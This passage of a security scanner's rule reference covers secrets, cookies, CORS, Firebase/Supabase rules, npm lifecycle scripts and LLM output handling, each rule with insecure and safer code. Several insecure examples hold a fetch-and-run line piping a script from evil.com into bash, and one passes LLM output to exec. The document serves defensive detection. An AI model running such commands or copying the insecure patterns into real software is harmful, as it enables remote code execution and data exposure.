### `auth.supabase-service-role-in-client`

**Supabase Service Role Key in Client File**

> Supabase service role key referenced in a client-side file — this key bypasses Row Level Security completely

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `static` |
| Category | Authentication |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures, A01 Broken Access Control

**CWE:** CWE-312, CWE-284

**ASVS:** ASVS 2.6.2

**WSTG:** WSTG-CRYP-04

**Tags:** `supabase` `service-role` `rls` `critical`

**Insecure Example:**
```
"use client";
const supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY!); // bypasses RLS
```

**Safer Example:**
```
"use client";
const supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!); // anon key only on client
```

**Remediation:** Never use the service role key on the client. Use the anon key for client-side, service role only in server-side code.

---

### `auth.stripe-secret-in-client`

**Stripe Secret Key Referenced in Client File**

> STRIPE_SECRET or stripe secret key pattern found in a client-side file, exposing it to browser users

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `medium` |
| Engine | `static` |
| Category | Authentication |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-312

**ASVS:** ASVS 2.6.2

**WSTG:** WSTG-CRYP-04

**Tags:** `stripe` `secret` `client`

**Insecure Example:**
```
"use client";
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!); // secret exposed to browser
```

**Safer Example:**
```
// Server component or API route only:
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);
// Client only uses publishable key
```

**Remediation:** Only use NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY on the client. Keep STRIPE_SECRET_KEY server-side only.

---

### `crypto.token-in-localstorage`

**Auth Token Stored in localStorage**

> Auth token written to localStorage — readable by any JavaScript on the page, including XSS payloads

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `static` |
| Category | Cryptography |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures, A07 Authentication Failures

**CWE:** CWE-922

**ASVS:** ASVS 3.4.2

**WSTG:** WSTG-SESS-09

**Tags:** `localstorage` `token` `xss` `session`

**Insecure Example:**
```
localStorage.setItem('token', accessToken); // readable by XSS
```

**Safer Example:**
```
// Server sets HttpOnly cookie:
res.cookie("session", token, { httpOnly: true, secure: true, sameSite: "lax" });
// Client never touches the token directly
```

**Remediation:** Use HttpOnly cookies for session tokens instead of localStorage. If using localStorage, ensure XSS is fully mitigated.

---

### `crypto.token-in-sessionstorage`

**Auth Token Stored in sessionStorage**

> Auth token written to sessionStorage — like localStorage, it is accessible to any JavaScript including XSS payloads

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `high` |
| Engine | `static` |
| Category | Cryptography |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-922

**ASVS:** ASVS 3.4.2

**WSTG:** WSTG-SESS-09

**Tags:** `sessionstorage` `token` `xss` `session`

**Insecure Example:**
```
sessionStorage.setItem('jwt', token);
```

**Safer Example:**
```
// Use HttpOnly cookies — the browser sends them automatically
// and they cannot be read by JavaScript
```

**Remediation:** Use HttpOnly cookies for session tokens instead of sessionStorage.

---

### `crypto.insecure-cookie`

**Cookie Missing Security Flags**

> Cookie is set without HttpOnly, Secure, or SameSite flags — vulnerable to XSS token theft, network interception, or CSRF

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `low` |
| Engine | `static` |
| Category | Cryptography |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures, A07 Authentication Failures

**CWE:** CWE-614, CWE-1004

**ASVS:** ASVS 3.4.1, ASVS 3.4.3, ASVS 3.4.5

**WSTG:** WSTG-SESS-02

**Tags:** `cookie` `session` `csrf` `xss`

**Insecure Example:**
```
res.cookie('session', token); // no flags
```

**Safer Example:**
```
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  maxAge: 3600000,
});
```

**Remediation:** Set cookies with HttpOnly, Secure, and SameSite=Lax (or Strict) flags.

**False Positive Notes:** Low confidence — flags may be set on adjacent lines not captured. Review full cookie-setting context.

---

## Configuration (`config`)

### `config.exposed-env-file`

**Environment File Potentially Committed**

> .env file present in scanned directory with content — if committed to version control, all secrets are exposed

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `medium` |
| Engine | `config` |
| Category | Configuration |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A02 Security Misconfiguration, A04 Cryptographic Failures

**CWE:** CWE-312

**ASVS:** ASVS 2.6.2

**WSTG:** WSTG-CONF-07

**Tags:** `env-file` `secrets` `config`

**Insecure Example:**
```
# .env committed to git
DATABASE_URL=postgresql://user:realpassword@host/db
```

**Safer Example:**
```
# .env in .gitignore
# .env.example committed with placeholder values:
DATABASE_URL=postgresql://user:password@localhost/mydb
```

**Remediation:** Add .env to .gitignore. Use .env.example for documentation. Rotate any real secrets already committed.

**False Positive Notes:** Add "# FAKE" or "# TEST" comment to skip if the file contains only example values.

---

### `config.cors-wildcard-origin`

**Permissive CORS Wildcard Origin**

> CORS wildcard origin (*) allows any website to make cross-origin requests to your API

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `high` |
| Engine | `config` |
| Category | Configuration |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A02 Security Misconfiguration

**CWE:** CWE-942

**ASVS:** ASVS 14.4.1

**WSTG:** WSTG-CONF-10

**Tags:** `cors` `config` `headers`

**Insecure Example:**
```
res.setHeader('Access-Control-Allow-Origin', '*');
```

**Safer Example:**
```
const allowed = ['https://app.example.com'];
res.setHeader('Access-Control-Allow-Origin', allowed.includes(req.headers.origin) ? req.headers.origin : '');
```

**Remediation:** Restrict CORS to specific allowed origins. Never use credentials:true with origin:*.

**False Positive Notes:** Public APIs intentionally using CORS * may suppress this. Severity escalates to critical when combined with credentials:true.

---

### `config.next-missing-security-headers`

**Missing Security Headers in next.config.js**

> next.config.js has no headers() configuration — CSP, HSTS, X-Frame-Options, and other security headers are not set

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `high` |
| Engine | `config` |
| Category | Configuration |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A02 Security Misconfiguration

**CWE:** CWE-693

**ASVS:** ASVS 14.4.3, ASVS 14.4.4

**WSTG:** WSTG-CONF-10

**Tags:** `nextjs` `headers` `csp` `hsts`

**Insecure Example:**
```
// next.config.js — no headers() function
```

**Safer Example:**
```
async headers() {
  return [{ source: '/(.*)', headers: [
    { key: 'X-Frame-Options', value: 'DENY' },
    { key: 'X-Content-Type-Options', value: 'nosniff' },
    { key: 'Strict-Transport-Security', value: 'max-age=63072000' },
    { key: 'Content-Security-Policy', value: "default-src 'self'" },
  ]}];
}
```

**Remediation:** Add a headers() function in next.config.js to set Content-Security-Policy, HSTS, X-Frame-Options, X-Content-Type-Options.

---

### `config.next-source-maps`

**Production Source Maps Enabled**

> productionBrowserSourceMaps:true exposes original application code to anyone viewing the site in DevTools

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `high` |
| Engine | `config` |
| Category | Configuration |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A02 Security Misconfiguration

**CWE:** CWE-540

**ASVS:** ASVS 14.3.1

**WSTG:** WSTG-CONF-01

**Tags:** `nextjs` `source-maps` `config`

**Insecure Example:**
```
// next.config.js
productionBrowserSourceMaps: true,
```

**Safer Example:**
```
// Remove the flag entirely (defaults to false)
// Use Sentry or similar for server-side source map uploads instead
```

**Remediation:** Remove productionBrowserSourceMaps:true from next.config.js unless intentionally serving source maps for error tracking.

---

### `config.firebase-permissive-rules`

**Firebase Security Rules Allow Public Access**

> Firebase rules contain "allow read/write: if true" — the database is publicly accessible to anyone without authentication

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `config` |
| Category | Configuration |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A01 Broken Access Control, A02 Security Misconfiguration

**CWE:** CWE-284

**ASVS:** ASVS 4.1.1

**WSTG:** WSTG-ATHZ-01

**Tags:** `firebase` `security-rules` `critical`

**Insecure Example:**
```
match /users/{doc} {
  allow read, write: if true; // anyone can access
}
```

**Safer Example:**
```
match /users/{userId} {
  allow read, write: if request.auth != null && request.auth.uid == userId;
}
```

**Remediation:** Require authentication in Firebase rules: allow read: if request.auth != null. Apply field-level validation.

---

### `config.supabase-missing-rls`

**Supabase Detected Without Row Level Security Policies**

> Supabase is used but no SQL migrations or RLS policies were found — any authenticated user can read all table rows

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `low` |
| Engine | `config` |
| Category | Configuration |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A01 Broken Access Control

**CWE:** CWE-284

**ASVS:** ASVS 4.2.1

**WSTG:** WSTG-ATHZ-01

**Tags:** `supabase` `rls` `access-control`

**Insecure Example:**
```
-- No RLS enabled, any authenticated user reads all rows
SELECT * FROM users;
```

**Safer Example:**
```
ALTER TABLE users ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Users view own data" ON users FOR SELECT
  USING (auth.uid() = id);
```

**Remediation:** Enable RLS on every Supabase table: ALTER TABLE users ENABLE ROW LEVEL SECURITY. Define per-user access policies.

**False Positive Notes:** Low confidence — RLS may be configured in a location not scanned (e.g., Supabase dashboard). Verify manually.

---

## Supply Chain (`dependency`)

### `supply-chain.lifecycle-postinstall`

**Lifecycle Script: postinstall**

> package.json defines a "postinstall" lifecycle script that runs automatically on npm/pnpm/yarn install

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `low` |
| Engine | `dependency` |
| Category | Supply Chain |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A03 Software Supply Chain Failures

**CWE:** CWE-506

**ASVS:** ASVS 14.2.4

**WSTG:** WSTG-CONF-05

**Tags:** `lifecycle-script` `supply-chain` `npm`

**Insecure Example:**
```
"postinstall": "curl https://evil.com/install.sh | bash"
```

**Safer Example:**
```
"postinstall": "tsc --build" // only deterministic build tools
```

**Remediation:** Audit this lifecycle script to ensure it only performs expected build operations. Use --ignore-scripts for untrusted packages.

**False Positive Notes:** Low confidence for non-suspicious scripts. Review the script content manually. Suspicious commands (curl, eval, base64) escalate to high.

---

### `supply-chain.lifecycle-preinstall`

**Lifecycle Script: preinstall**

> package.json defines a "preinstall" lifecycle script that runs automatically on npm/pnpm/yarn install

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `low` |
| Engine | `dependency` |
| Category | Supply Chain |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A03 Software Supply Chain Failures

**CWE:** CWE-506

**ASVS:** ASVS 14.2.4

**WSTG:** WSTG-CONF-05

**Tags:** `lifecycle-script` `supply-chain` `npm`

**Insecure Example:**
```
"preinstall": "curl https://evil.com/install.sh | bash"
```

**Safer Example:**
```
"preinstall": "tsc --build" // only deterministic build tools
```

**Remediation:** Audit this lifecycle script to ensure it only performs expected build operations. Use --ignore-scripts for untrusted packages.

**False Positive Notes:** Low confidence for non-suspicious scripts. Review the script content manually. Suspicious commands (curl, eval, base64) escalate to high.

---

### `supply-chain.lifecycle-prepare`

**Lifecycle Script: prepare**

> package.json defines a "prepare" lifecycle script that runs automatically on npm/pnpm/yarn install

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `low` |
| Engine | `dependency` |
| Category | Supply Chain |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A03 Software Supply Chain Failures

**CWE:** CWE-506

**ASVS:** ASVS 14.2.4

**WSTG:** WSTG-CONF-05

**Tags:** `lifecycle-script` `supply-chain` `npm`

**Insecure Example:**
```
"prepare": "curl https://evil.com/install.sh | bash"
```

**Safer Example:**
```
"prepare": "tsc --build" // only deterministic build tools
```

**Remediation:** Audit this lifecycle script to ensure it only performs expected build operations. Use --ignore-scripts for untrusted packages.

**False Positive Notes:** Low confidence for non-suspicious scripts. Review the script content manually. Suspicious commands (curl, eval, base64) escalate to high.

---

### `supply-chain.lifecycle-install`

**Lifecycle Script: install**

> package.json defines a "install" lifecycle script that runs automatically on npm/pnpm/yarn install

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `low` |
| Engine | `dependency` |
| Category | Supply Chain |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A03 Software Supply Chain Failures

**CWE:** CWE-506

**ASVS:** ASVS 14.2.4

**WSTG:** WSTG-CONF-05

**Tags:** `lifecycle-script` `supply-chain` `npm`

**Insecure Example:**
```
"install": "curl https://evil.com/install.sh | bash"
```

**Safer Example:**
```
"install": "tsc --build" // only deterministic build tools
```

**Remediation:** Audit this lifecycle script to ensure it only performs expected build operations. Use --ignore-scripts for untrusted packages.

**False Positive Notes:** Low confidence for non-suspicious scripts. Review the script content manually. Suspicious commands (curl, eval, base64) escalate to high.

---

### `supply-chain.wildcard-version`

**Wildcard Dependency Version**

> A dependency uses a wildcard version (*) or "latest" — any version including one with vulnerabilities can be installed

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `high` |
| Engine | `dependency` |
| Category | Supply Chain |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A03 Software Supply Chain Failures

**CWE:** CWE-1104

**ASVS:** ASVS 14.2.1

**WSTG:** WSTG-CONF-05

**Tags:** `dependency` `semver` `supply-chain`

**Insecure Example:**
```
"some-package": "*" // any version, including malicious ones
```

**Safer Example:**
```
"some-package": "^2.3.1" // locked to minor/patch updates only
```

**Remediation:** Pin to a specific version or use a conservative semver range like "^x.y.z".

---

### `supply-chain.missing-lockfile`

**Missing Dependency Lockfile**

> No lockfile found (package-lock.json, pnpm-lock.yaml, yarn.lock, bun.lock) — dependency resolution is non-deterministic

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `high` |
| Engine | `dependency` |
| Category | Supply Chain |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A03 Software Supply Chain Failures

**CWE:** CWE-1104

**ASVS:** ASVS 14.2.1

**WSTG:** WSTG-CONF-05

**Tags:** `lockfile` `dependency` `supply-chain`

**Insecure Example:**
```
// No pnpm-lock.yaml — each install may pull different dependency versions
```

**Safer Example:**
```
// Commit pnpm-lock.yaml and use "pnpm install --frozen-lockfile" in CI
```

**Remediation:** Commit a lockfile to version control. Run pnpm install / npm install / yarn to generate one.

---

## AI Security (`ai`)

### `ai.llm-output-html-sink`

**LLM Output Rendered as Raw HTML**

> AI/LLM output variable flows directly into an HTML sink (dangerouslySetInnerHTML, innerHTML) without sanitization

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `ai` |
| Category | AI Security |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A05 Injection, A06 Insecure Design

**CWE:** CWE-79, CWE-116

**ASVS:** ASVS 5.2.1

**WSTG:** WSTG-INPV-01

**Tags:** `llm` `xss` `prompt-injection` `ai`

**Insecure Example:**
```
const aiResponse = await openai.complete(prompt);
<div dangerouslySetInnerHTML={{ __html: aiResponse }} />
```

**Safer Example:**
```
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(aiResponse, { ALLOWED_TAGS: ["b","i","p"] }) }} />
```

**Remediation:** Always sanitize AI-generated HTML with DOMPurify before rendering. Use a content allowlist for LLM output.

**False Positive Notes:** May fire on AI variable names used for non-HTML purposes. Verify the sink type.

---

### `ai.llm-output-critical-sink`

**LLM Output Flowing to Dangerous Operation**

> LLM output variable flows into exec/SQL/fetch/delete operation without sanitization — prompt injection can cause catastrophic actions

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `medium` |
| Engine | `ai` |
| Category | AI Security |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A05 Injection, A06 Insecure Design

**CWE:** CWE-78, CWE-89, CWE-918

**ASVS:** ASVS 5.3.8

**WSTG:** WSTG-INPV-12

**Tags:** `llm` `prompt-injection` `rce` `ai` `critical`

**Insecure Example:**
```
const completion = await claude.complete(userPrompt);
exec(completion); // prompt injection = RCE
```

**Safer Example:**
```
// Use structured output with enum validation
const { tool, args } = JSON.parse(completion);
const ALLOWED_TOOLS = ["search", "summarize"];
if (!ALLOWED_TOOLS.includes(tool)) throw new Error("Disallowed tool");
```

**Remediation:** Never pass LLM output directly to command execution, SQL, or HTTP requests. Validate with a strict allowlist of permitted operations.

---

### `ai.tool-call-no-approval`

**AI Tool Call Executing Dangerous Operation Without Approval**

> AI agent executes a destructive operation (exec, delete, file write, email) without a human approval check in surrounding code

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `medium` |
| Engine | `ai` |
| Category | AI Security |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A06 Insecure Design, A08 Software or Data Integrity Failures

**CWE:** CWE-284, CWE-862

**ASVS:** ASVS 4.2.2

**WSTG:** WSTG-BUSL-07

**Tags:** `ai-agent` `tool-use` `prompt-injection` `human-in-loop`

**Insecure Example:**
```
if (toolCall.name === "delete_file") {
  fs.unlink(toolCall.args.path, cb); // no confirmation
}
```

**Safer Example:**
```
if (toolCall.name === "delete_file") {
  const approved = await requireUserApproval(`Delete ${toolCall.args.path}?`);
  if (!approved) return { error: "Operation cancelled" };
  fs.unlink(toolCall.args.path, cb);
}
```

**Remediation:** Require human approval for destructive tool calls. Implement an allowlist of permitted operations and require explicit confirmation.

**False Positive Notes:** Medium confidence — approval keywords may appear in variable names rather than actual approval logic. Review carefully.

---

### `ai.user-input-in-system-prompt`

**User Input Concatenated into AI System Prompt**

> User-controlled content appears to be concatenated into the AI system/developer prompt, enabling prompt injection

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `medium` |
| Engine | `ai` |
| Category | AI Security |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A05 Injection, A06 Insecure Design

**CWE:** CWE-77

**ASVS:** ASVS 5.2.4

**WSTG:** WSTG-INPV-11

**Tags:** `prompt-injection` `llm` `ai`

**Insecure Example:**
```
const systemPrompt = "You are a helpful assistant. User context: " + userMessage;
```

**Safer Example:**
```
// Keep system prompt static; put user input only in user role:
[
  { role: "system", content: "You are a helpful assistant." },
  { role: "user", content: userMessage }, // user input here only
]
```

**Remediation:** Keep system prompts static. Use structured message roles — never concatenate user input into system instructions.

**False Positive Notes:** Medium confidence based on variable naming patterns. May fire on coincidental variable name similarities.

---

### `ai.rag-injection-risk`

**RAG Documents Mixed into AI System Instructions**

> Retrieved documents appear to be concatenated into system-level AI instructions, enabling indirect prompt injection

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `low` |
| Engine | `ai` |
| Category | AI Security |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A05 Injection

**CWE:** CWE-77

**ASVS:** ASVS 5.2.4

**WSTG:** WSTG-INPV-11

**Tags:** `rag` `prompt-injection` `llm` `ai`

**Insecure Example:**
```
const systemPrompt = `Instructions: ${baseInstructions}\nContext: ${documents.join("\n")}`;
```

**Safer Example:**
```
[
  { role: "system", content: baseInstructions },
  { role: "user", content: `Context documents:\n${documents.join("\n")}\n\nQuestion: ${question}` },
]
```

**Remediation:** Separate system instructions from retrieved context. Use a distinct "tool" or "assistant" message role for retrieved documents.

**False Positive Notes:** Low confidence — pattern matching on variable names may produce false positives. Review the actual message structure.

---
